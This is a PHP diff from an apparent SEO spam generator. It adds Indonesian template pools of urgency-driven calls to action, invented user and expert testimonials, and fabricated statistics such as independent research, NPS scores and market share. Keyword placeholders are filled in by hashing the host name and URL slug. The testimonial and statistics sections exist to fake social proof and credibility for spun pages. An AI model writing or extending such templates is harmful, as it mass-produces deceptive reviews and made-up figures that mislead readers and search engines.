+    '{$CTA} — {$BRANDS} tidak sekadar platform tetapi ekosistem konten {$W} {$E} {$KUAL} yang hidup dan berkembang. {$TAG} {$URGENCY}! {$AUDIENCE} sudah merasakan dampak positifnya. {$V_AKSES} sekarang.',
+    '{$TAG} {$V_AKSES} {$BRANDS} dan bergabung dengan komunitas pecinta konten {$W} {$E} {$KUAL} terbesar. {$CTA} {$KONEK2}, {$URGENCY}! {$AUDIENCE} — bersama kita wujudkan akses informasi {$W} {$E} tanpa batas.',
+    '{$BRANDS} hadir untuk Anda — {$CTA} {$V_AKSES} konten {$W} {$E} {$KUAL} sekarang juga tanpa ragu. {$URGENCY}! {$AUDIENCE} telah membuktikan bahwa {$BRANDS} adalah sumber {$W} {$E} nomor satu. {$TAG} Terima kasih telah memilih {$BRANDS}.',
+    '{$CTA} {$WAKTU}! {$V_AKSES} {$BRANDS} dan temukan {$ANGKA} konten {$W} {$E} {$KUAL} baru yang {$EMOSI}. {$URGENCY} — {$AUDIENCE} sudah duluan menikmati. Jangan sampai Anda tertinggal.',
+    '{$TAG} {$WAKTU} adalah momentum {$EMOSI} untuk {$V_AKSES} {$BRANDS}. Dengan {$ANGKA} konten {$W} {$E} {$KUAL}, {$CTA} — {$URGENCY}! {$AUDIENCE} sudah membuktikan kualitas platform ini.',
+    '{$KONEK2}, {$CTA} {$WAKTU}! {$BRANDS} {$V_SAJIKAN} {$ANGKA} konten {$W} {$E} {$KUAL} yang {$EMOSI} setiap hari. {$URGENCY} — {$AUDIENCE} tidak pernah kecewa. {$V_AKSES} dan rasakan sendiri.',
+    '{$BRANDS} challenge {$WAKTU}: {$V_AKSES} {$ANGKA} konten {$W} {$E} {$KUAL} yang {$EMOSI} dalam satu sesi. {$CTA} {$URGENCY}! {$TAG} {$AUDIENCE} sudah menyelesaikan challenge ini.',
+    '{$CTA} — {$WAKTU} {$BRANDS} memberikan akses {$EMOSI} ke {$ANGKA} konten {$W} {$E} {$KUAL} eksklusif. {$URGENCY}! {$AUDIENCE} jangan lewatkan penawaran terbatas ini. {$V_AKSES} sekarang.',
+    '{$TAG} {$V_AKSES} {$BRANDS} {$WAKTU} dan dapatkan {$ANGKA} rekomendasi konten {$W} {$E} {$KUAL} yang {$EMOSI}. {$CTA} {$KONEK2}, {$URGENCY}! {$AUDIENCE} sudah merasakan manfaatnya.',
+    '{$BRANDS} promo {$WAKTU}: {$CTA} {$V_AKSES} {$ANGKA} konten {$W} {$E} {$KUAL} gratis yang {$EMOSI}. {$URGENCY} — {$AUDIENCE} sudah memanfaatkan kesempatan emas ini. Jangan tertinggal.',
+    '{$KONEK2}, {$WAKTU} {$BRANDS} menambahkan {$ANGKA} konten {$W} {$E} {$KUAL} baru. {$CTA} — pengalaman {$EMOSI} menanti! {$URGENCY}! {$AUDIENCE} selalu mendapat yang terbaru di {$BRANDS}.',
+    '{$CTA} {$WAKTU}! {$BRANDS} milestone {$EMOSI}: {$ANGKA} pengguna aktif menikmati konten {$W} {$E} {$KUAL}. {$TAG} {$URGENCY} — {$AUDIENCE} jadilah bagian dari komunitas terdepan ini.',
+    '{$TAG} {$BRANDS} deal {$WAKTU}: {$V_AKSES} {$ANGKA} fitur {$KUAL} untuk konten {$W} {$E} dengan pengalaman {$EMOSI}. {$CTA} {$URGENCY}! {$AUDIENCE} sudah upgrade. Giliran Anda.',
+    '{$V_AKSES} {$BRANDS} {$WAKTU} untuk {$ANGKA} konten {$W} {$E} {$KUAL} yang {$EMOSI}. {$CTA} — {$KONEK2}, {$URGENCY}! {$AUDIENCE} membuktikan {$BRANDS} adalah destinasi terbaik.',
+    '{$BRANDS} reward {$WAKTU}: {$CTA} dan dapatkan akses ke {$ANGKA} konten {$W} {$E} {$KUAL} yang {$EMOSI}. {$TAG} {$URGENCY}! {$AUDIENCE} sudah mengklaim reward mereka. {$V_AKSES} sekarang.',
+    '{$KONEK2}, {$CTA} {$WAKTU}! Jadilah salah satu dari {$ANGKA} early adopter konten {$W} {$E} {$KUAL} di {$BRANDS}. Pengalaman {$EMOSI} menanti. {$URGENCY} — {$AUDIENCE} sudah selangkah lebih maju.',
+    '{$TAG} {$BRANDS} event {$WAKTU}: {$V_AKSES} {$ANGKA} konten {$W} {$E} {$KUAL} dalam event {$EMOSI} terbesar. {$CTA} {$URGENCY}! {$AUDIENCE} dari seluruh dunia sudah bergabung.',
+    '{$CTA} — {$BRANDS} {$V_SAJIKAN} {$ANGKA} konten {$W} {$E} {$KUAL} baru {$WAKTU} yang {$EMOSI}. {$URGENCY}! {$TAG} {$AUDIENCE} tahu bahwa {$BRANDS} selalu memberikan yang terbaik.',
+    '{$V_AKSES} sekarang! {$BRANDS} {$WAKTU} unggul dengan {$ANGKA} konten {$W} {$E} {$KUAL} yang {$EMOSI}. {$CTA} {$KONEK2}, {$URGENCY}! {$AUDIENCE} puas dengan layanan di {$BRANDS}.',
+    '{$TAG} {$BRANDS} flash {$WAKTU}: {$CTA} {$V_AKSES} {$ANGKA} konten {$W} {$E} {$KUAL} spesial. Momentum {$EMOSI} ini terbatas! {$URGENCY} — {$AUDIENCE} tidak mau melewatkan satu detik pun.',
+    '{$KONEK2}, {$BRANDS} milestone {$EMOSI} {$WAKTU}: {$ANGKA} konten {$W} {$E} {$KUAL} telah dinikmati jutaan pembaca. {$CTA} {$URGENCY}! {$AUDIENCE} buktikan sendiri kualitas {$BRANDS}.',
+    '{$BRANDS} season {$WAKTU}: {$CTA} {$V_AKSES} {$ANGKA} episode konten {$W} {$E} {$KUAL} baru yang {$EMOSI}. {$TAG} {$URGENCY}! {$AUDIENCE} sudah menantikan season terbaru ini.',
+    '{$CTA} {$WAKTU}! {$BRANDS} {$V_SAJIKAN} catalog {$EMOSI} berisi {$ANGKA} konten {$W} {$E} {$KUAL}. {$URGENCY} — {$AUDIENCE} sudah menjelajahi semua. {$V_AKSES} dan mulai petualangan Anda.',
+    '{$TAG} {$BRANDS} breakthrough {$EMOSI} {$WAKTU}: {$ANGKA} inovasi {$KUAL} untuk pengalaman konten {$W} {$E} terbaik. {$CTA} {$URGENCY}! {$AUDIENCE} sudah merasakan transformasinya.',
+    '{$V_AKSES} {$BRANDS} {$WAKTU} — {$CTA} dan temukan {$ANGKA} hidden gem konten {$W} {$E} {$KUAL} yang {$EMOSI}. {$KONEK2}, {$URGENCY}! {$AUDIENCE} sudah menemukan favorit mereka.',
+    '{$BRANDS} crescendo {$WAKTU}: {$ANGKA} konten {$W} {$E} {$KUAL} menanti dengan pengalaman {$EMOSI}. {$CTA} {$TAG} {$URGENCY}! {$AUDIENCE} jadikan {$BRANDS} pilihan nomor satu Anda.',
+    '{$KONEK2}, {$CTA} — {$BRANDS} {$WAKTU} adalah rumah bagi {$ANGKA} konten {$W} {$E} {$KUAL} yang {$EMOSI}. {$URGENCY}! {$AUDIENCE} sudah merasa di rumah. {$V_AKSES} dan bergabunglah sekarang.',
+);
+
+// P6: Testimoni/Quote — Social proof dari "pengguna" (~30-40 kata)
+$p['desc_p6'] = array(
+    '"Saya tidak percaya {$BRANDS} punya konten {$W} {$E} se-{$ADJ} ini!" kata salah satu {$AUDIENCE}. {$ANGKA} orang sudah membuktikan kualitas {$KUAL} yang {$EMOSI} dari platform ini {$WAKTU}.',
+    'Salah satu {$PROF} mengaku: "Konten {$W} {$E} di {$BRANDS} benar-benar {$EMOSI} dan {$ADJ}." {$ANGKA} viewer setuju dengan penilaian ini. {$TAG} {$SOCIAL} membuktikan semuanya.',
+    '{$SOCIAL} — itu bukan sekadar angka. Seorang {$SUBJECT} {$PLATFORM} berkata: "{$BRANDS} menyajikan konten {$W} {$E} {$KUAL} yang belum pernah saya temukan di tempat lain." {$EMOSI}!',
+    '"Awalnya ragu, tapi setelah {$V_LIHAT} konten {$W} {$E} di {$BRANDS}, saya langsung ketagihan," ungkap {$SUBJECT} {$ADJ}. {$KONEK}, {$ANGKA} orang merasakan hal yang sama {$WAKTU}.',
+    'Testimoni {$AUDIENCE}: "{$BRANDS} menghadirkan konten {$W} {$E} yang {$EMOSI} dan {$ADJ}. {$TAG} Tidak ada platform lain yang bisa menyaingi kualitas {$KUAL} seperti ini."',
+    '"Konten {$W} {$E} di {$BRANDS} membuat saya {$EMOSI}," tulis seorang {$PROF} di {$PLATFORM}. Review {$ADJ} ini sudah di-share {$ANGKA} kali. {$SOCIAL} tidak pernah bohong.',
+    '{$SUBJECT} {$ADJ} membagikan pengalamannya: "Sejak menemukan {$BRANDS}, saya tidak pernah kecewa. Konten {$W} {$E} {$KUAL} mereka benar-benar {$EMOSI}." {$ANGKA} orang setuju.',
+    'Dari {$PLATFORM}, seorang {$AUDIENCE} menulis: "{$BRANDS} adalah satu-satunya tempat untuk konten {$W} {$E} yang benar-benar {$ADJ} dan {$EMOSI}." {$TAG} {$SOCIAL}.',
+    '"Tidak menyesal sudah {$V_LIHAT} konten {$W} {$E} di {$BRANDS} {$WAKTU}," kata {$SUBJECT} sang {$PROF}. Rating {$ANGKA} membuktikan bahwa ini konten {$KUAL} yang {$EMOSI}.',
+    '{$KONEK}, ini bukan sekedar hype. {$SUBJECT} {$ADJ} memverifikasi: "{$BRANDS} benar-benar {$EMOSI}. Konten {$W} {$E} {$KUAL} ini layak mendapat {$TAG}." {$ANGKA} review positif.',
+    'Seorang {$PROF} veteran bersaksi: "Dalam karir saya, belum pernah menemukan konten {$W} {$E} se-{$ADJ} ini." {$BRANDS} mendapat {$ANGKA} endorsement {$WAKTU}. {$EMOSI}!',
+    '"Kalau Anda belum coba {$BRANDS}, Anda ketinggalan," kata {$SUBJECT} {$PLATFORM}. Konten {$W} {$E} {$KUAL} mereka sudah {$SOCIAL}. {$TAG} Rating: {$ANGKA}.',
+    '{$AUDIENCE} sejati tahu: "{$BRANDS} tidak pernah mengecewakan." {$ANGKA} pengguna aktif {$WAKTU} membuktikan konten {$W} {$E} {$ADJ} ini benar-benar {$EMOSI}. {$SOCIAL}.',
+    'Review terbaru {$PLATFORM}: "{$BRANDS} = konten {$W} {$E} {$KUAL} + pengalaman {$EMOSI}." {$SUBJECT} {$ADJ} ini sudah membagikan review ke {$ANGKA} follower-nya. {$TAG}.',
+    '"Ini {$EMOSI} banget!" — reaksi spontan {$SUBJECT} saat pertama kali {$V_LIHAT} konten {$W} {$E} di {$BRANDS}. {$ANGKA} orang punya reaksi serupa {$WAKTU}. {$SOCIAL}.',
+    'Seorang {$AUDIENCE} menulis panjang lebar di {$PLATFORM}: "{$BRANDS} menyajikan konten {$W} {$E} yang {$ADJ}. {$EMOSI}. Saya beri rating {$ANGKA}." {$TAG} Recommended!',
+    '"Teman saya yang {$PROF} merekomendasikan {$BRANDS} dan ternyata benar, konten {$W} {$E} mereka {$EMOSI}!" — {$SUBJECT} {$ADJ}. {$SOCIAL}. {$ANGKA} share.',
+    '{$KONEK}, bukti tidak bisa dibantah. {$SUBJECT} {$PLATFORM} posting: "{$V_LIHAT} konten {$W} {$E} di {$BRANDS}! {$ADJ} dan {$KUAL}!" Post ini sudah {$ANGKA} engagement.',
+    '"Best thing ever," kata seorang {$PROF} setelah mengakses konten {$W} {$E} di {$BRANDS} {$WAKTU}. {$TAG} {$SOCIAL}. Review {$ADJ} ini viral {$ANGKA} share.',
+    'Dari komunitas {$AUDIENCE}: "{$BRANDS} sudah menjadi standar {$KUAL} untuk konten {$W} {$E}. {$EMOSI} dan {$ADJ} adalah kata yang tepat." {$ANGKA} member setuju.',
+    '"Speechless. {$BRANDS} benar-benar {$EMOSI}," tulis {$SUBJECT} sang {$PROF} di {$PLATFORM}. Konten {$W} {$E} {$KUAL} ini mendapat {$ANGKA} likes dalam hitungan jam {$WAKTU}.',
+    'Influencer {$SUBJECT} {$ADJ} mereview: "Konten {$W} {$E} di {$BRANDS} itu {$EMOSI}, {$ADJ}, dan layak dapat {$TAG}." Video reviewnya sudah {$ANGKA} views {$WAKTU}.',
+    '"Saya sudah coba banyak platform, tapi {$BRANDS} yang paling {$ADJ}," ungkap {$SUBJECT} {$PROF}. Konten {$W} {$E} {$KUAL} mereka {$EMOSI}. {$SOCIAL}. {$ANGKA}.',
+    '"Worth every second!" — itulah review singkat dari {$SUBJECT} untuk konten {$W} {$E} di {$BRANDS}. {$TAG} {$ADJ} dan {$EMOSI}. Sudah {$ANGKA} views {$WAKTU}.',
+    'User rating {$ANGKA} untuk {$BRANDS}! Seorang {$AUDIENCE} menjelaskan: "Konten {$W} {$E} {$KUAL} ini {$EMOSI}. Tidak ada yang menandingi." {$TAG} {$SOCIAL} {$WAKTU}.',
+    // batch 2 (26-50)
+    '"Saya rekomendasikan ke seluruh tim saya!" kata {$PROF} tentang konten {$W} {$E} di {$BRANDS}. {$ANGKA} profesional sudah memberikan endorsement {$ADJ}. {$EMOSI}!',
+    'Polling {$PLATFORM} menunjukkan: {$ANGKA} responden memilih {$BRANDS} sebagai sumber konten {$W} {$E} terbaik. "{$EMOSI} dan {$KUAL}," kata {$SUBJECT} {$ADJ}.',
+    '"Tidak pernah se-excited ini!" ungkap {$SUBJECT} {$PROF} setelah {$V_LIHAT} konten {$W} {$E} di {$BRANDS} {$WAKTU}. {$TAG} {$ANGKA} orang merasa sama.',
+    'Thread viral di {$PLATFORM}: "{$BRANDS} konten {$W} {$E} {$KUAL} yang {$EMOSI}." — {$SUBJECT} {$ADJ}. Thread ini di-bookmark {$ANGKA} orang. {$SOCIAL}.',
+    '"Ini game changer," kata {$PROF} soal konten {$W} {$E} di {$BRANDS}. {$TAG} {$ANGKA} expert setuju. {$EMOSI} dan {$ADJ} — dua kata yang paling sering disebut {$WAKTU}.',
+    'Komunitas {$AUDIENCE} memberi penghargaan: "{$BRANDS} = standar emas konten {$W} {$E}." {$ANGKA} vote masuk {$WAKTU}. {$SOCIAL} membuktikan klaim {$EMOSI} ini.',
+    '"Baru pertama kali nemu yang se-{$ADJ} ini," tulis {$SUBJECT} di {$PLATFORM}. Konten {$W} {$E} {$BRANDS} {$KUAL} memang {$EMOSI}. {$TAG} {$ANGKA} agree.',
+    '"Langsung subscribe!" — reaksi {$SUBJECT} {$ADJ} terhadap {$BRANDS} {$WAKTU}. Konten {$W} {$E} {$KUAL} yang {$EMOSI} ini sudah {$SOCIAL}. {$ANGKA} new members.',
+    'Review panjang dari {$PROF}: "Dalam {$ANGKA} tahun pengalaman, {$BRANDS} menyajikan konten {$W} {$E} paling {$ADJ}." {$TAG} {$EMOSI}! {$AUDIENCE} wajib tahu.',
+    '"Bookmarked and shared!" kata {$SUBJECT} setelah {$V_LIHAT} konten {$W} {$E} di {$BRANDS}. {$ANGKA} orang juga melakukan hal sama {$WAKTU}. {$SOCIAL}. {$EMOSI}!',
+    'Survey {$WAKTU}: {$ANGKA} dari responden menyebut {$BRANDS} sebagai "platform konten {$W} {$E} paling {$ADJ}." {$TAG} {$EMOSI}. {$AUDIENCE} sudah membuktikan.',
+    '"Addicted," — satu kata dari {$SUBJECT} {$PROF} untuk {$BRANDS}. Konten {$W} {$E} {$KUAL} yang {$EMOSI} ini sudah {$ANGKA} views di {$PLATFORM}. {$SOCIAL}.',
+    '"Mind = blown," tulis {$SUBJECT} {$ADJ} di {$PLATFORM} tentang {$BRANDS}. Konten {$W} {$E} {$EMOSI} ini {$SOCIAL}. {$TAG} {$ANGKA} reaksi serupa {$WAKTU}.',
+    '"Finally!" seru {$SUBJECT} saat menemukan konten {$W} {$E} {$KUAL} di {$BRANDS}. {$ADJ} dan {$EMOSI}. {$ANGKA} orang merasakan kelegaan sama. {$SOCIAL} {$WAKTU}.',
+    'Panel ahli {$PROF} sepakat: "{$BRANDS} menetapkan benchmark baru untuk konten {$W} {$E}." {$TAG} {$ANGKA} pakar setuju ini {$EMOSI}. {$AUDIENCE} wajib simak.',
+    '"Ini yang saya cari selama ini," kata {$AUDIENCE} tentang konten {$W} {$E} di {$BRANDS}. {$ADJ} dan {$EMOSI}. {$ANGKA} orang relate {$WAKTU}. {$SOCIAL}.',
+    '"Mustahil tidak suka," — {$SUBJECT} {$ADJ} soal {$BRANDS}. Konten {$W} {$E} {$KUAL} ini {$EMOSI} menurut {$ANGKA} reviewer di {$PLATFORM}. {$TAG} verified.',
+    'Vlog review {$SUBJECT} {$PROF}: "{$BRANDS} = konten {$W} {$E} {$ADJ}. Period." Video ini {$ANGKA} views, {$SOCIAL}. {$EMOSI} adalah kata kunci {$WAKTU}.',
+    '"Saya bukan fanboy, tapi {$BRANDS} memang {$ADJ}," akui {$SUBJECT} {$PLATFORM}. Konten {$W} {$E} {$KUAL} mereka {$EMOSI}. {$TAG} {$ANGKA} skeptis berubah pikiran.',
+    '"Shut up and take my attention!" — {$SUBJECT} {$ADJ} ke {$BRANDS} {$WAKTU}. Konten {$W} {$E} {$EMOSI} ini {$SOCIAL}. {$ANGKA} meme dibuat dari quote ini. {$TAG}.',
+);
+
+// P7: Fakta/Statistik — Data pendukung credibility (~30-40 kata)
+$p['desc_p7'] = array(
+    'Data {$WAKTU} menunjukkan: {$ANGKA} pengguna aktif mengakses konten {$W} {$E} di {$BRANDS} setiap hari. Statistik {$KUAL} ini menempatkan {$BRANDS} sebagai platform {$ADJ} nomor satu {$PLATFORM}.',
+    'Menurut riset independen, konten {$W} {$E} {$BRANDS} mendapat engagement {$ANGKA} lebih tinggi dari kompetitor. {$TAG} Fakta {$EMOSI} ini dikonfirmasi {$WAKTU} oleh {$SOCIAL}.',
+    'Infografis {$WAKTU}: {$BRANDS} melayani konten {$W} {$E} ke {$ANGKA} wilayah. Penetrasi {$KUAL} ini menjadikan {$BRANDS} sebagai pemain {$ADJ} di industri konten digital {$PLATFORM}.',
+    'Berdasarkan analytics {$WAKTU}, rata-rata pengguna menghabiskan {$ANGKA} menit di {$BRANDS} per sesi. Konten {$W} {$E} {$KUAL} dan pengalaman {$EMOSI} adalah faktor utamanya.',
+    'Fact check: {$BRANDS} telah {$V_SAJIKAN} konten {$W} {$E} ke {$ANGKA} pengguna unik {$WAKTU}. {$TAG} Angka {$EMOSI} ini melampaui benchmark industri {$KUAL} manapun.',
+    'Studi {$WAKTU} mengungkap: {$ANGKA} dari pengguna {$BRANDS} kembali dalam 24 jam. Retensi {$KUAL} ini membuktikan konten {$W} {$E} mereka benar-benar {$EMOSI} dan {$ADJ}.',
+    'Database {$BRANDS} mencatat {$ANGKA} konten {$W} {$E} {$KUAL} tersedia {$WAKTU}. Katalog {$ADJ} ini terus bertumbuh dengan rate {$EMOSI} yang tidak tertandingi di {$PLATFORM}.',
+    'Index kepuasan pengguna {$BRANDS} {$WAKTU}: {$ANGKA}. Metrik {$KUAL} ini menempatkan konten {$W} {$E} mereka di kategori {$ADJ}. {$TAG} {$SOCIAL} mendukung klaim ini.',
+    'Laporan {$WAKTU}: traffic {$BRANDS} melonjak {$ANGKA} berkat konten {$W} {$E} {$ADJ}. {$TAG} Pertumbuhan {$EMOSI} ini menarik perhatian {$SOCIAL} dan pakar industri.',
+    'Audit konten {$WAKTU} membuktikan: {$BRANDS} memiliki {$ANGKA} item {$KUAL} dalam kategori {$W} {$E}. Koleksi {$ADJ} ini {$EMOSI} dan terus diperbarui setiap hari.',
+    'Benchmark report: {$BRANDS} mengungguli {$ANGKA} kompetitor di metrik konten {$W} {$E} {$WAKTU}. Performa {$KUAL} dan {$ADJ} ini {$EMOSI}. {$TAG} Data verified.',
+    'Survey kepuasan: {$ANGKA} responden menilai konten {$W} {$E} {$BRANDS} sebagai {$ADJ} dan {$KUAL}. {$EMOSI} menjadi kata yang paling sering muncul di feedback {$WAKTU}.',
+    'Telemetri {$WAKTU}: {$BRANDS} mencapai uptime {$ANGKA} untuk layanan konten {$W} {$E}. Reliabilitas {$KUAL} ini memastikan pengalaman {$ADJ} dan {$EMOSI} tanpa gangguan.',
+    'Growth metric: {$BRANDS} merekrut {$ANGKA} pengguna baru {$WAKTU}. Daya tarik konten {$W} {$E} {$KUAL} yang {$EMOSI} menjadi magnet {$ADJ} yang tak tertahankan. {$TAG}.',
+    'Analisis sentimen {$PLATFORM}: {$ANGKA} mention positif untuk konten {$W} {$E} {$BRANDS} {$WAKTU}. Sentimen {$EMOSI} dan {$ADJ} mendominasi. {$TAG} {$SOCIAL}.',
+    'Neraca digital {$WAKTU}: aset konten {$W} {$E} {$BRANDS} mencakup {$ANGKA} katalog {$KUAL}. Portfolio {$ADJ} ini menghasilkan pengalaman {$EMOSI} bagi setiap pengunjung.',
+    'KPI dashboard: {$BRANDS} mencatat {$ANGKA} session untuk konten {$W} {$E} {$WAKTU}. Metrik {$KUAL} ini mencerminkan performa {$ADJ} yang {$EMOSI}. {$SOCIAL}.',
+    'Competitive analysis: {$BRANDS} memimpin dengan margin {$ANGKA} di segmen konten {$W} {$E}. Keunggulan {$KUAL} dan {$ADJ} ini {$EMOSI}. {$TAG} {$WAKTU}.',
+    'User funnel {$WAKTU}: {$ANGKA} pengunjung {$BRANDS} melakukan konversi ke viewer aktif konten {$W} {$E}. Conversion rate {$KUAL} ini {$EMOSI} dan {$ADJ}.',
+    'Heat map analisis: {$ANGKA} area engagement tertinggi ada di konten {$W} {$E} {$BRANDS}. Pola interaksi {$KUAL} ini {$EMOSI} menurut UX expert. {$TAG} {$WAKTU}.',
+    'SEO metrics {$WAKTU}: {$BRANDS} mendominasi {$ANGKA} keyword terkait konten {$W} {$E}. Visibility {$KUAL} yang {$ADJ} ini menghasilkan traffic {$EMOSI}. {$SOCIAL}.',
+    'Engagement scorecard: {$BRANDS} mencetak {$ANGKA} di kategori konten {$W} {$E} {$WAKTU}. Skor {$KUAL} dan {$ADJ} ini {$EMOSI}. {$TAG} Benchmark tertinggi.',
+    'Market share {$WAKTU}: {$BRANDS} menguasai {$ANGKA} pangsa konten {$W} {$E} di {$PLATFORM}. Dominasi {$KUAL} yang {$ADJ} ini {$EMOSI}. {$SOCIAL} mengkonfirmasi.',
+    'A/B testing membuktikan: konten {$W} {$E} format {$BRANDS} {$ANGKA} lebih efektif daripada format standar. Inovasi {$KUAL} {$ADJ} ini {$EMOSI}. {$TAG} {$WAKTU}.',
+    'Retrospektif {$WAKTU}: perjalanan {$BRANDS} dari nol ke {$ANGKA} pengguna konten {$W} {$E} adalah cerita {$EMOSI}. Strategi {$KUAL} dan {$ADJ} menjadi kunci. {$SOCIAL}.',
+    // batch 2 (26-50)
+    'ROI analysis {$WAKTU}: setiap menit di {$BRANDS} menghasilkan {$ANGKA} unit kepuasan konten {$W} {$E}. Efisiensi {$KUAL} yang {$ADJ} ini {$EMOSI}. {$TAG}.',
+    'Cohort analysis: {$ANGKA} pengguna {$BRANDS} batch {$WAKTU} masih aktif. Retensi konten {$W} {$E} {$KUAL} yang {$EMOSI} ini {$ADJ}. {$SOCIAL} sebagai bukti.',
+    'NPS score {$BRANDS}: {$ANGKA}. Promoter konten {$W} {$E} ini sebut pengalaman mereka {$EMOSI} dan {$ADJ}. {$TAG} {$KUAL} tertinggi di industri {$WAKTU}.',
+    'Bandwidth report: {$BRANDS} mentransmisi {$ANGKA} TB konten {$W} {$E} {$WAKTU}. Infrastruktur {$KUAL} yang {$ADJ} memastikan streaming {$EMOSI} tanpa buffer.',
+    'Content velocity: {$BRANDS} merilis {$ANGKA} konten {$W} {$E} baru {$WAKTU}. Produktivitas {$KUAL} dan {$ADJ} ini {$EMOSI}. {$TAG} Tidak ada yang menandingi.',
+    'UX survey {$WAKTU}: {$ANGKA} pengguna menilai navigasi konten {$W} {$E} {$BRANDS} sebagai {$ADJ}. Kemudahan {$KUAL} ini membuat pengalaman jadi {$EMOSI}.',
+    'Click-through rate konten {$W} {$E} {$BRANDS}: {$ANGKA} {$WAKTU}. CTR {$KUAL} yang {$ADJ} ini {$EMOSI} dibanding rata-rata industri. {$TAG} {$SOCIAL}.',
+    'Uptime SLA: {$BRANDS} menjaga {$ANGKA} availability untuk konten {$W} {$E} {$WAKTU}. Komitmen {$KUAL} yang {$ADJ} ini menghasilkan kepercayaan {$EMOSI}.',
+    'Award tracker: {$BRANDS} meraih {$ANGKA} penghargaan untuk konten {$W} {$E} {$WAKTU}. Rekognisi {$KUAL} dan {$ADJ} ini {$EMOSI}. {$TAG} {$SOCIAL}.',
+    'API call stats: {$ANGKA} request harian ke sistem konten {$W} {$E} {$BRANDS} {$WAKTU}. Demand {$KUAL} yang {$ADJ} ini {$EMOSI}. {$TAG} Record-breaking.',
+    'Load testing: {$BRANDS} menangani {$ANGKA} concurrent users konten {$W} {$E} tanpa degradasi {$WAKTU}. Skalabilitas {$KUAL} {$ADJ} ini {$EMOSI}. {$SOCIAL}.',
+    'Geographic reach: konten {$W} {$E} {$BRANDS} diakses dari {$ANGKA} negara {$WAKTU}. Jangkauan {$KUAL} yang {$ADJ} ini {$EMOSI}. {$TAG} Global impact.',
+    'Cache hit ratio: {$ANGKA} untuk konten {$W} {$E} {$BRANDS} {$WAKTU}. Optimalisasi {$KUAL} dan {$ADJ} ini memastikan loading {$EMOSI}. {$SOCIAL} verified.',
+    'Content diversity index: {$BRANDS} menawarkan {$ANGKA} kategori konten {$W} {$E} {$WAKTU}. Variasi {$KUAL} yang {$ADJ} ini menghasilkan pengalaman {$EMOSI}.',
+    'Time-to-first-byte: {$BRANDS} menyajikan konten {$W} {$E} dalam hitungan {$ANGKA} milidetik {$WAKTU}. Kecepatan {$KUAL} {$ADJ} ini {$EMOSI}. {$TAG} Lightning fast.',
+    'Platform maturity index: {$BRANDS} mendapat skor {$ANGKA} untuk konten {$W} {$E} {$WAKTU}. Kedewasaan {$KUAL} {$ADJ} ini menghasilkan stabilitas {$EMOSI}. {$SOCIAL}.',
+    'Innovation score: {$ANGKA} fitur baru untuk konten {$W} {$E} diluncurkan {$BRANDS} {$WAKTU}. Inovasi {$KUAL} {$ADJ} ini {$EMOSI}. {$TAG} First mover advantage.',
+    'Ecosystem value: {$BRANDS} menciptakan ekosistem konten {$W} {$E} senilai {$ANGKA} engagement {$WAKTU}. Ekosistem {$KUAL} {$ADJ} ini {$EMOSI}. {$SOCIAL}.',
+    'Trust score: {$ANGKA} — peringkat kepercayaan pengguna terhadap konten {$W} {$E} {$BRANDS} {$WAKTU}. Kredibilitas {$KUAL} {$ADJ} ini {$EMOSI}. {$TAG} Verified.',
+    'Quality assurance: {$BRANDS} menerapkan {$ANGKA} checkpoint untuk konten {$W} {$E} {$WAKTU}. QA {$KUAL} {$ADJ} ini memastikan output {$EMOSI}. {$SOCIAL} approved.',
+);
+
+    return $p;
+} // end _sp()
+
+// Extract static pool refs — alias to static storage, zero allocation after first request
+// $_sp sudah diset di atas (baris ~465), tidak perlu panggil _sp() lagi
+$_subjects         =& $_sp['subjects'];
+$_actions          =& $_sp['actions'];
+$_places           =& $_sp['places'];
+$_professions      =& $_sp['professions'];
+$_hooks_konteks    =& $_sp['hooks_konteks'];
+$_hooks_instruksi  =& $_sp['hooks_instruksi'];
+$_ctas             =& $_sp['ctas'];
+$_urgencies        =& $_sp['urgencies'];
+$_socials          =& $_sp['socials'];
+$_tones            =& $_sp['tones'];
+$_adjs             =& $_sp['adjs'];
+$_tags             =& $_sp['tags'];
+$_platforms        =& $_sp['platforms'];
+$_audiences        =& $_sp['audiences'];
+$_titles_konteks   =& $_sp['titles_konteks'];
+$_titles_instruksi =& $_sp['titles_instruksi'];
+$_waktu            =& $_sp['waktu'];
+$_angka            =& $_sp['angka'];
+$_emosi            =& $_sp['emosi'];
+$_v_lihat          =& $_sp['v_lihat'];
+$_v_akses          =& $_sp['v_akses'];
+$_v_sajikan        =& $_sp['v_sajikan'];
+$_p_sebagai        =& $_sp['p_sebagai'];
+$_p_yang           =& $_sp['p_yang'];
+$_p_di             =& $_sp['p_di'];
+$_p_tentang        =& $_sp['p_tentang'];
+$_konek            =& $_sp['konek'];
+$_konek2           =& $_sp['konek2'];
+$_kual             =& $_sp['kual'];
+$_desc_p1          =& $_sp['desc_p1'];
+$_desc_p2          =& $_sp['desc_p2'];
+$_desc_p3          =& $_sp['desc_p3'];
+$_desc_p4          =& $_sp['desc_p4'];
+$_desc_p5          =& $_sp['desc_p5'];
+$_desc_p6          =& $_sp['desc_p6'];
+$_desc_p7          =& $_sp['desc_p7'];
+
+// ─── Hash-based Smart Selection ──────────────────────────────────────────────
+$_tdSeed = $_SERVER['HTTP_HOST'] . '|' . $incomingSlug . '|titledesc';
+
+// Step 1: Pilih kategori (Konteks=0, Instruksi=1)
+$_kategori = abs(crc32($_tdSeed . 'kat')) % 2;
+
+// Step 2: Pilih index template (0-149, dynamic count)
+$_tplIdx = abs(crc32($_tdSeed . 'tpl')) % 130;
+
+// Step 3: Pilih variabel dari pool (semua hash-based, konsisten per domain+keyword)
+$_selSubject    = $_subjects[abs(crc32($_tdSeed . 'subj')) % 100];
+$_selAction     = $_actions[abs(crc32($_tdSeed . 'act')) % 100];
+$_selPlace      = $_places[abs(crc32($_tdSeed . 'plc')) % 98];
+$_selProf       = $_professions[abs(crc32($_tdSeed . 'prof')) % 100];
+$_selCta        = $_ctas[abs(crc32($_tdSeed . 'cta')) % 100];
+$_selUrgency    = $_urgencies[abs(crc32($_tdSeed . 'urg')) % 100];
+$_selSocial     = $_socials[abs(crc32($_tdSeed . 'soc')) % 100];
+$_selTone       = $_tones[abs(crc32($_tdSeed . 'tone')) % 100];
+$_selAdj        = $_adjs[abs(crc32($_tdSeed . 'adj')) % 100];
+$_selTag        = $_tags[abs(crc32($_tdSeed . 'tag')) % 100];
+$_selPlatform   = $_platforms[abs(crc32($_tdSeed . 'plat')) % 50];
+$_selAudience   = $_audiences[abs(crc32($_tdSeed . 'aud')) % 50];
+$_selWaktu      = $_waktu[abs(crc32($_tdSeed . 'wkt')) % 50];
+$_selAngka      = $_angka[abs(crc32($_tdSeed . 'ang')) % 50];
